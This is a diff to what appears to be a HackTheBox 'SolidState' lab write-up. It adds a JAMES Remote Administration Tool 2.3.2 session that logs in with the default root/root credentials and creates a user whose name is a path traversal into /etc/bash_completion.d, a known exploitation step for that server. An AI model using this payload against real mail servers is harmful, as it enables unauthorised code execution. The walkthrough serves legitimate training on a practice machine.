@@ -202,7 +202,17 @@ mindy@solidstate:~$ cat /etc/passwd
   - Read here: https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html#intended-path
   - Add User: `hardyboy`
 ```CSS
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
 adduser ../../../../../../../../etc/bash_completion.d hardyboy
+User ../../../../../../../../etc/bash_completion.d added
+quit
+Bye
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236778269-50d42f3d-ffb2-46c0-9cf9-3646cb038f16.png)
 
